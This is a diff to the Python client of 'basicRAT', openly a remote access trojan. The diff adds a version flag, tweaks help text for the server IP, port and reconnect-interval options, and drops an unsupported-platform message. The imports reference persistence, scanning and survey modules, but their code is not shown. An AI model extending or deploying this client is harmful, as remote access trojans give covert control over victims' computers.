@@ -1,4 +1,5 @@
 #!/usr/bin/env python
+# -*- coding: utf-8 -*-
 
 #
 # basicRAT client
@@ -13,6 +14,8 @@ import time
 from core import crypto, persistence, scan, survey, toolkit
 
 
+__version__ = '0.3'
+
 # determine system platform
 if sys.platform.startswith('win'):
     PLAT = 'win'
@@ -21,7 +24,6 @@ elif sys.platform.startswith('linux'):
 elif sys.platform.startswith('darwin'):
     PLAT = 'mac'
 else:
-    print 'This platform is not supported.'
     sys.exit(1)
 
 
@@ -82,18 +84,25 @@ def client_loop(conn, dhkey):
 
 def get_parser():
     parser = argparse.ArgumentParser(description='basicRAT client')
-    parser.add_argument('-i', '--ip', help='Server IP.',
+    parser.add_argument('-i', '--ip', help='server ip',
                         default='127.0.0.1', type=str)
-    parser.add_argument('-p', '--port', help='Port to connect on.',
+    parser.add_argument('-p', '--port', help='port to connect on',
                         default=1337, type=int)
-    parser.add_argument('-t', '--timeout', help='timeout',
+    parser.add_argument('-t', '--timeout', help='reconnect interval',
                         default=30, type=int)
+    parser.add_argument('-v', '--version', help='display the current version',
+                        action='store_true')
     return parser
 
 
 def main():
     parser = get_parser()
     args = vars(parser.parse_args())
+
+    if args['version']:
+        print('basicRAT %s' % __version__)
+        return
+
     host = args['ip']
     port = args['port']
     timeout = args['timeout']
